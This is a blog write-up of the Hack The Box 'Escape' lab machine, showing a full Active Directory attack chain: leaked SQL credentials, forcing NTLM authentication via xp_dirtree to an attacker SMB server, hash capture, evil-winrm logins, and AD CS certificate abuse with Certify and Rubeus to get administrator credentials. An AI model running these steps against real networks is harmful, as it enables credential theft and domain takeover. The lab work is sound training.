<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Hack The Box - Escape [Medium] | 0x73796C31</title><meta name=keywords content><meta name=description content="This is a Windows Machine which is part of an Active Directory. I would try my best to explain the stuff that I did, since that I&rsquo;ve seen pretty bad write-ups that are not explaining anything. I also want to be honest, and I will link every write-up that I used to exploit the machine.
I am still learning Active Directory at the time of writing this, so there might be errors, I will do my best to mitigate that!"><meta name=author content="Dimitar Ganev"><link rel=canonical href=https://sy1.sh/writeups/htb-escape/><link crossorigin=anonymous href=/assets/css/stylesheet.f8c2ee4fde28779dff9afcd3046f6bd6fc9cbeb1ddf60d48a81b676d7162c1bb.css integrity="sha256-+MLuT94od53/mvzTBG9r1vycvrHd9g1IqBtnbXFiwbs=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://sy1.sh/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://sy1.sh/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://sy1.sh/favicon-32x32.png><link rel=apple-touch-icon href=https://sy1.sh/apple-touch-icon.png><link rel=mask-icon href=https://sy1.sh/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Hack The Box - Escape [Medium]"><meta property="og:description" content="This is a Windows Machine which is part of an Active Directory. I would try my best to explain the stuff that I did, since that I&rsquo;ve seen pretty bad write-ups that are not explaining anything. I also want to be honest, and I will link every write-up that I used to exploit the machine.
I am still learning Active Directory at the time of writing this, so there might be errors, I will do my best to mitigate that!"><meta property="og:type" content="article"><meta property="og:url" content="https://sy1.sh/writeups/htb-escape/"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2023-03-23T02:01:27+03:00"><meta property="article:modified_time" content="2023-03-23T02:01:27+03:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Hack The Box - Escape [Medium]"><meta name=twitter:description content="This is a Windows Machine which is part of an Active Directory. I would try my best to explain the stuff that I did, since that I&rsquo;ve seen pretty bad write-ups that are not explaining anything. I also want to be honest, and I will link every write-up that I used to exploit the machine.
I am still learning Active Directory at the time of writing this, so there might be errors, I will do my best to mitigate that!"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Writeups","item":"https://sy1.sh/writeups/"},{"@type":"ListItem","position":3,"name":"Hack The Box - Escape [Medium]","item":"https://sy1.sh/writeups/htb-escape/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Hack The Box - Escape [Medium]","name":"Hack The Box - Escape [Medium]","description":"This is a Windows Machine which is part of an Active Directory. I would try my best to explain the stuff that I did, since that I\u0026rsquo;ve seen pretty bad write-ups that are not explaining anything. I also want to be honest, and I will link every write-up that I used to exploit the machine.\nI am still learning Active Directory at the time of writing this, so there might be errors, I will do my best to mitigate that!","keywords":[],"articleBody":"This is a Windows Machine which is part of an Active Directory. I would try my best to explain the stuff that I did, since that I’ve seen pretty bad write-ups that are not explaining anything. I also want to be honest, and I will link every write-up that I used to exploit the machine.\nI am still learning Active Directory at the time of writing this, so there might be errors, I will do my best to mitigate that!\nEnumerating I started with a simple nmap scan.\n$ nmap -Pn 10.10.11.202 PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 1433/tcp open ms-sql-s 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Now since I am new to Active Directory I turned to https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb to check what I can try.\nEventually, after trying most of them, I landed on smbclient\n$ smbclient --no-pass -L 10.10.11.202 Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Public Disk SYSVOL Disk Logon server share This is a list of shared folders, the one that we can take a look at is Public\n$ smbclient -N //10.10.11.202/Public Try \"help\" to get a list of possible commands. smb: \\\u003e ls . D 0 Sat Nov 19 06:51:25 2022 .. D 0 Sat Nov 19 06:51:25 2022 SQL Server Procedures.pdf A 49551 Fri Nov 18 08:39:43 2022 5184255 blocks of size 4096. 1276406 blocks available smb: \\\u003e get \"SQL Server Procedures.pdf\" getting file \\SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (62.8 KiloBytes/sec) (average 62.8 KiloBytes/sec) Opening, the PDF states that we can use PublicUser:GuestUserCantWrite1 to log in to the SQL Server. We can use the impacket-mssqlclient which is a tool\n$ impacket-mssqlclient WORKGROUP/PublicUser:GuestUserCantWrite1@10.10.11.202 Once I was in I started enumerating the database, looking at this and that, but I had no luck, I turned to some write-ups to follow up.\nNow most of the write-ups are just skipping the explanation of this step, but I think that it is really important to know what’s going on, so I will do my best to explain it.\nFollowing up this https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#steal-netntlm-hash-relay-attack attack, I tried the following thing:\nI checked if I can execute xp_dirtree:\nSQL\u003e EXEC sp_helprotect 'xp_dirtree'; Owner Object Grantee Grantor ProtectType Action Column ------ -------------------- ------------ ------- ----------- -------------- ------ sys xp_dirtree public dbo b'Grant ' Execute . It turns out I can, so to capture the authentication hash, I need to set up an SMB server:\n# My Machine $ impacket-smbserver -smb2support smb ./smb And then to execute the xp_dirtree on the SQL Server\nSQL\u003e exec master.dbo.xp_dirtree '\\\\\\smb' Doing this would catch the AUTHENTICATE_MESSAGE, the user and the hash.\n$ impacket-smbserver -smb2support smb ./smb Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed [*] Incoming connection (10.10.11.202,52180) [*] AUTHENTICATE_MESSAGE (sequel\\sql_svc,DC) [*] User DC\\sql_svc authenticated successfully [*] sql_svc::sequel:aaaaaaaaaaaaaaaa:84e0a29415d2823f80593c9bc45d158c:010100000000000080fba2b8945ed9010f6267444f7024440000000001001000780056007a005000590061005000570003001000780056007a0050005900610050005700020010006c004f0054006f006f00540076007700040010006c004f0054006f006f005400760077000700080080fba2b8945ed90106000400020000000800300030000000000000000000000000300000c57e7de4e6e8e7baebb297a4bfc1a9019bc96f8f58ffbd9cb233cec428ece87f0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100340032000000000000000000 Now I need to crack the hash, I won’t post the results here, so you have to figure that one on your own, it is simple enough! :)\nUsing the cracked password, I can log in using the evil-winrm\n$ evil-winrm --ip 10.10.11.202 --user sql_svc --password $(cat ./password) Now, we need to start enumerating again. I used winPEAS\n*Evil-WinRM* PS C:\\Users\\sql_svc\\Documents\u003e upload /home/syl/tools/win/winPEASany.exe I eventually stumbled across interesting files and I’ve enumerated the users. The interesting file was C:\\SQLServer\\Logs\\ERRORLOG.BAK and upon further inspection I’ve got the password for the user Ryan.Cooper.\n$ evil-winrm --ip 10.10.11.202 --user Ryan.Cooper --password $(cat ./password ryan_password) ... *Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents\u003e gc ../Desktop/user.txt Now I needed to escalate, I’ve used this guide for misconfigured certificates that cause AD CS Domain Escalation. https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation\nI’ve uploaded Certify to the SQL Server (user login) and tried to find vulnerable certificates.\nNOTE: Certify is a tool to enumerate and abuse misconfigured AD CS, you can find its source code here: https://github.com/GhostPack/Certify. Unfortunately(or fortunately) there aren’t any prebuilt binaries and you have to build it yourself. It is well explained in the README.\n*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents\u003e ./Certify.exe find /vulnerable ... [!] Vulnerable Certificates Templates : CA Name : dc.sequel.htb\\sequel-DC-CA Template Name : UserAuthentication Schema Version : 2 Validity Period : 10 years Renewal Period : 6 weeks msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT mspki-enrollment-flag : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS Authorized Signatures Required : 0 With that tool, I found a vulnerable certificate that I can use to impersonate an administrator. Following up the attack on hacktricks:\n*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents\u003e .\\Certify.exe request /ca:dc.sequel.htb\\sequel-DC-CA /template:UserAuthentication /altname:administrator ... CERTIFICATE ... [*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx I’ve downloaded the certificate on my machine and ran the command to convert it to pfx and I’ve uploaded it back to the server.\nUsing another tool called Rubeus that I’ve used to send raw request for a TGT towards the DC.\n$ ./Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /password:123 [*] Action: Ask TGT [*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb [*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\\administrator' [*] Using domain controller: fe80::5438:a078:e66d:b560%4:88 [+] TGT request successful! [*] base64(ticket.kirbi): ... [*] Getting credentials using U2U CredentialInfo : Version : 0 EncryptionType : rc4_hmac CredentialData : CredentialCount : 1 NTLM : \u003cNTLM HASH\u003e Now, that gave me the NTLM Hash, which is the cryptographic format in which user passwords are stored on Windows systems.\nI can use that with:\n$ evil-winrm -H \"\" -u \"administrator\" -i 10.10.11.202 M* PS C:\\Users\\Administrator\\Documents\u003e gc ../Desktop/root.txt References https://blog.zerospl0it.com/posts/Escape/ https://yu8pentest.blogspot.com/2023/02/escape.html https://medium.com/@Kushagra007/writeup-escape-hackthebox-dbee2d761d15 https://breached.vc/Thread-Escape-HTB-Discussion?highlight=escape ","wordCount":"958","inLanguage":"en","datePublished":"2023-03-23T02:01:27+03:00","dateModified":"2023-03-23T02:01:27+03:00","author":{"@type":"Person","name":"Dimitar Ganev"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://sy1.sh/writeups/htb-escape/"},"publisher":{"@type":"Organization","name":"0x73796C31","logo":{"@type":"ImageObject","url":"https://sy1.sh/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://sy1.sh accesskey=h title="0x73796C31 (Alt + H)">0x73796C31</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://sy1.sh/posts/ title=Archive><span>Archive</span></a></li><li><a href=https://sy1.sh/cv title=CV><span>CV</span></a></li><li><a href=https://sy1.sh/writeups/ title=Write-ups><span>Write-ups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://sy1.sh>Home</a>&nbsp;»&nbsp;<a href=https://sy1.sh/writeups/>Writeups</a></div><h1 class=post-title>Hack The Box - Escape [Medium]</h1><div class=post-meta><span title='2023-03-23 02:01:27 +0300 +0300'>March 23, 2023</span>&nbsp;·&nbsp;5 min</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><ul><li><a href=#enumerating aria-label=Enumerating>Enumerating</a></li></ul><li><a href=#references aria-label=References>References</a></li></ul></div></details></div><div class=post-content><p>This is a Windows Machine which is part of an Active Directory. I would try my best to explain the stuff that I did, since that I&rsquo;ve seen pretty bad write-ups that are not explaining anything. I also want to be honest, and I will link every write-up that I used to exploit the machine.</p><p>I am still learning Active Directory at the time of writing this, so there might be errors, I will do my best to mitigate that!</p><h2 id=enumerating>Enumerating<a hidden class=anchor aria-hidden=true href=#enumerating>#</a></h2><p>I started with a simple <code>nmap</code> scan.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ nmap -Pn 10.10.11.202
</span></span><span class=line><span class=cl>PORT     STATE SERVICE
</span></span><span class=line><span class=cl>53/tcp   open  domain
</span></span><span class=line><span class=cl>88/tcp   open  kerberos-sec
</span></span><span class=line><span class=cl>135/tcp  open  msrpc
</span></span><span class=line><span class=cl>139/tcp  open  netbios-ssn
</span></span><span class=line><span class=cl>389/tcp  open  ldap
</span></span><span class=line><span class=cl>445/tcp  open  microsoft-ds
</span></span><span class=line><span class=cl>464/tcp  open  kpasswd5
</span></span><span class=line><span class=cl>593/tcp  open  http-rpc-epmap
</span></span><span class=line><span class=cl>636/tcp  open  ldapssl
</span></span><span class=line><span class=cl>1433/tcp open  ms-sql-s
</span></span><span class=line><span class=cl>3268/tcp open  globalcatLDAP
</span></span><span class=line><span class=cl>3269/tcp open  globalcatLDAPssl
</span></span></code></pre></div><p>Now since I am new to Active Directory I turned to <a href=https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb>https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb</a> to check what I can try.</p><p>Eventually, after trying most of them, I landed on <code>smbclient</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ smbclient --no-pass -L 10.10.11.202
</span></span><span class=line><span class=cl>Sharename       Type      Comment
</span></span><span class=line><span class=cl>---------       ----      -------
</span></span><span class=line><span class=cl>ADMIN$          Disk      Remote Admin
</span></span><span class=line><span class=cl>C$              Disk      Default share
</span></span><span class=line><span class=cl>IPC$            IPC       Remote IPC
</span></span><span class=line><span class=cl>NETLOGON        Disk      Logon server share 
</span></span><span class=line><span class=cl>Public          Disk      
</span></span><span class=line><span class=cl>SYSVOL          Disk      Logon server share 
</span></span></code></pre></div><p>This is a list of shared folders, the one that we can take a look at is <code>Public</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ smbclient -N //10.10.11.202/Public
</span></span><span class=line><span class=cl>Try <span class=s2>&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> ls
</span></span><span class=line><span class=cl>  .                                   D        <span class=m>0</span>  Sat Nov <span class=m>19</span> 06:51:25 <span class=m>2022</span>
</span></span><span class=line><span class=cl>  ..                                  D        <span class=m>0</span>  Sat Nov <span class=m>19</span> 06:51:25 <span class=m>2022</span>
</span></span><span class=line><span class=cl>  SQL Server Procedures.pdf           A    <span class=m>49551</span>  Fri Nov <span class=m>18</span> 08:39:43 <span class=m>2022</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=m>5184255</span> blocks of size 4096. <span class=m>1276406</span> blocks available
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> get <span class=s2>&#34;SQL Server Procedures.pdf&#34;</span>
</span></span><span class=line><span class=cl>getting file <span class=se>\S</span>QL Server Procedures.pdf of size <span class=m>49551</span> as SQL Server Procedures.pdf <span class=o>(</span>62.8 KiloBytes/sec<span class=o>)</span> <span class=o>(</span>average 62.8 KiloBytes/sec<span class=o>)</span>
</span></span></code></pre></div><p>Opening, the PDF states that we can use <code>PublicUser:GuestUserCantWrite1</code> to log in to the SQL Server. We can use the <code>impacket-mssqlclient</code> which is a tool</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ impacket-mssqlclient WORKGROUP/PublicUser:GuestUserCantWrite1@10.10.11.202
</span></span></code></pre></div><p>Once I was in I started enumerating the database, looking at this and that, but I had no luck, I turned to some write-ups to follow up.</p><p>Now most of the write-ups are just skipping the explanation of this step, but I think that it is really important to know what&rsquo;s going on, so I will do my best to explain it.</p><p>Following up this <a href=https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#steal-netntlm-hash-relay-attack>https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#steal-netntlm-hash-relay-attack</a> attack, I tried the following thing:</p><p>I checked if I can execute <code>xp_dirtree</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-SQL data-lang=SQL><span class=line><span class=cl><span class=k>SQL</span><span class=o>&gt;</span><span class=w> </span><span class=k>EXEC</span><span class=w> </span><span class=n>sp_helprotect</span><span class=w> </span><span class=s1>&#39;xp_dirtree&#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>Owner</span><span class=w>    </span><span class=k>Object</span><span class=w>                 </span><span class=n>Grantee</span><span class=w>        </span><span class=n>Grantor</span><span class=w>   </span><span class=n>ProtectType</span><span class=w>   </span><span class=n>Action</span><span class=w>           </span><span class=k>Column</span><span class=w>   
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>------   --------------------   ------------   -------   -----------   --------------   ------   
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>sys</span><span class=w>      </span><span class=n>xp_dirtree</span><span class=w>             </span><span class=k>public</span><span class=w>         </span><span class=n>dbo</span><span class=w>       </span><span class=n>b</span><span class=s1>&#39;Grant     &#39;</span><span class=w>   </span><span class=k>Execute</span><span class=w>          </span><span class=p>.</span><span class=w>        
</span></span></span></code></pre></div><p>It turns out I can, so to capture the authentication hash, I need to set up an SMB server:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># My Machine</span>
</span></span><span class=line><span class=cl>$ impacket-smbserver -smb2support smb ./smb
</span></span></code></pre></div><p>And then to execute the <code>xp_dirtree</code> on the SQL Server</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-SQL data-lang=SQL><span class=line><span class=cl><span class=k>SQL</span><span class=o>&gt;</span><span class=w> </span><span class=k>exec</span><span class=w> </span><span class=n>master</span><span class=p>.</span><span class=n>dbo</span><span class=p>.</span><span class=n>xp_dirtree</span><span class=w> </span><span class=s1>&#39;\\&lt;myIP&gt;\smb&#39;</span><span class=w>
</span></span></span></code></pre></div><p>Doing this would catch the <code>AUTHENTICATE_MESSAGE</code>, the user and the hash.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ impacket-smbserver -smb2support smb ./smb
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Impacket v0.10.0 - Copyright <span class=m>2022</span> SecureAuth Corporation
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Config file parsed
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Callback added <span class=k>for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Callback added <span class=k>for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Config file parsed
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Config file parsed
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Config file parsed
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Incoming connection <span class=o>(</span>10.10.11.202,52180<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> AUTHENTICATE_MESSAGE <span class=o>(</span>sequel<span class=se>\s</span>ql_svc,DC<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> User DC<span class=se>\s</span>ql_svc authenticated successfully
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> sql_svc::sequel:aaaaaaaaaaaaaaaa:84e0a29415d2823f80593c9bc45d158c:010100000000000080fba2b8945ed9010f6267444f7024440000000001001000780056007a005000590061005000570003001000780056007a0050005900610050005700020010006c004f0054006f006f00540076007700040010006c004f0054006f006f005400760077000700080080fba2b8945ed90106000400020000000800300030000000000000000000000000300000c57e7de4e6e8e7baebb297a4bfc1a9019bc96f8f58ffbd9cb233cec428ece87f0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100340032000000000000000000
</span></span></code></pre></div><p>Now I need to crack the hash, I won&rsquo;t post the results here, so you have to figure that one on your own, it is simple enough! :)</p><p>Using the cracked password, I can log in using the <code>evil-winrm</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ evil-winrm --ip 10.10.11.202 --user sql_svc --password <span class=k>$(</span>cat ./password<span class=k>)</span>
</span></span></code></pre></div><p>Now, we need to start enumerating again. I used <a href=https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS>winPEAS</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=p>*</span><span class=nb>Evil-WinRM</span><span class=p>*</span> <span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>sql_svc</span><span class=p>\</span><span class=n>Documents</span><span class=p>&gt;</span> <span class=n>upload</span> <span class=p>/</span><span class=n>home</span><span class=p>/</span><span class=n>syl</span><span class=p>/</span><span class=n>tools</span><span class=p>/</span><span class=n>win</span><span class=p>/</span><span class=n>winPEASany</span><span class=p>.</span><span class=py>exe</span>
</span></span></code></pre></div><p>I eventually stumbled across interesting files and I&rsquo;ve enumerated the users. The interesting file was <code>C:\SQLServer\Logs\ERRORLOG.BAK</code> and upon further inspection I&rsquo;ve got the password for the user <code>Ryan.Cooper</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ evil-winrm --ip 10.10.11.202 --user Ryan.Cooper --password <span class=k>$(</span>cat ./password ryan_password<span class=k>)</span>
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\R</span>yan.Cooper<span class=se>\D</span>ocuments&gt; gc ../Desktop/user.txt
</span></span><span class=line><span class=cl>&lt;user_hash&gt;
</span></span></code></pre></div><p>Now I needed to escalate, I&rsquo;ve used this guide for misconfigured certificates that cause AD CS Domain Escalation. <a href=https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation</a></p><p>I&rsquo;ve uploaded Certify to the SQL Server (user login) and tried to find vulnerable certificates.</p><blockquote><p><strong>NOTE</strong>: Certify is a tool to enumerate and abuse misconfigured AD CS, you can find its source code here: <a href=https://github.com/GhostPack/Certify>https://github.com/GhostPack/Certify</a>. Unfortunately(or fortunately) there aren&rsquo;t any prebuilt binaries and you have to build it yourself. It is well explained in the README.</p></blockquote><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=p>*</span><span class=nb>Evil-WinRM</span><span class=p>*</span> <span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>Ryan</span><span class=p>.</span><span class=n>Cooper</span><span class=p>\</span><span class=n>Documents</span><span class=p>&gt;</span> <span class=p>./</span><span class=n>Certify</span><span class=p>.</span><span class=py>exe</span> <span class=n>find</span> <span class=p>/</span><span class=n>vulnerable</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>[!]</span> <span class=n>Vulnerable</span> <span class=n>Certificates</span> <span class=n>Templates</span> <span class=err>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>CA</span> <span class=n>Name</span>                               <span class=err>:</span> <span class=n>dc</span><span class=p>.</span><span class=py>sequel</span><span class=p>.</span><span class=n>htb</span><span class=p>\</span><span class=nb>sequel-DC</span><span class=n>-CA</span>
</span></span><span class=line><span class=cl>    <span class=n>Template</span> <span class=n>Name</span>                         <span class=err>:</span> <span class=n>UserAuthentication</span>
</span></span><span class=line><span class=cl>    <span class=n>Schema</span> <span class=n>Version</span>                        <span class=err>:</span> <span class=mf>2</span>
</span></span><span class=line><span class=cl>    <span class=n>Validity</span> <span class=n>Period</span>                       <span class=err>:</span> <span class=mf>10</span> <span class=n>years</span>
</span></span><span class=line><span class=cl>    <span class=n>Renewal</span> <span class=n>Period</span>                        <span class=err>:</span> <span class=mf>6</span> <span class=n>weeks</span>
</span></span><span class=line><span class=cl>    <span class=nb>msPKI-Certificate</span><span class=n>-Name-Flag</span>          <span class=err>:</span> <span class=n>ENROLLEE_SUPPLIES_SUBJECT</span>
</span></span><span class=line><span class=cl>    <span class=nb>mspki-enrollment</span><span class=n>-flag</span>                 <span class=err>:</span> <span class=n>INCLUDE_SYMMETRIC_ALGORITHMS</span><span class=p>,</span> <span class=n>PUBLISH_TO_DS</span>
</span></span><span class=line><span class=cl>    <span class=n>Authorized</span> <span class=n>Signatures</span> <span class=n>Required</span>        <span class=err>:</span> <span class=mf>0</span>
</span></span></code></pre></div><p>With that tool, I found a vulnerable certificate that I can use to impersonate an administrator. Following up the attack on hacktricks:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=p>*</span><span class=nb>Evil-WinRM</span><span class=p>*</span> <span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>Ryan</span><span class=p>.</span><span class=n>Cooper</span><span class=p>\</span><span class=n>Documents</span><span class=p>&gt;</span> <span class=p>.\</span><span class=n>Certify</span><span class=p>.</span><span class=py>exe</span> <span class=n>request</span> <span class=p>/</span><span class=n>ca</span><span class=err>:</span><span class=n>dc</span><span class=p>.</span><span class=py>sequel</span><span class=p>.</span><span class=n>htb</span><span class=p>\</span><span class=nb>sequel-DC</span><span class=n>-CA</span> <span class=p>/</span><span class=n>template</span><span class=err>:</span><span class=n>UserAuthentication</span> <span class=p>/</span><span class=n>altname</span><span class=err>:</span><span class=n>administrator</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>...</span> <span class=n>CERTIFICATE</span> <span class=p>...</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[*]</span> <span class=n>Convert</span> <span class=n>with</span><span class=err>:</span> <span class=n>openssl</span> <span class=n>pkcs12</span> <span class=n>-in</span> <span class=n>cert</span><span class=p>.</span><span class=py>pem</span> <span class=n>-keyex</span> <span class=n>-CSP</span> <span class=s2>&#34;Microsoft Enhanced Cryptographic Provider v1.0&#34;</span> <span class=n>-export</span> <span class=n>-out</span> <span class=n>cert</span><span class=p>.</span><span class=py>pfx</span>
</span></span></code></pre></div><p>I&rsquo;ve downloaded the certificate on my machine and ran the command to convert it to <code>pfx</code> and I&rsquo;ve uploaded it back to the server.</p><p>Using another tool called <a href=https://github.com/GhostPack/Rubeus>Rubeus</a> that I&rsquo;ve used to send raw request for a TGT towards the DC.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=p>$</span> <span class=p>./</span><span class=n>Rubeus</span><span class=p>.</span><span class=py>exe</span> <span class=n>asktgt</span> <span class=p>/</span><span class=n>user</span><span class=err>:</span><span class=n>administrator</span> <span class=p>/</span><span class=n>certificate</span><span class=err>:</span><span class=n>cert</span><span class=p>.</span><span class=py>pfx</span> <span class=p>/</span><span class=n>getcredentials</span> <span class=p>/</span><span class=n>password</span><span class=err>:</span><span class=mf>123</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[*]</span> <span class=n>Action</span><span class=err>:</span> <span class=n>Ask</span> <span class=n>TGT</span>
</span></span><span class=line><span class=cl>
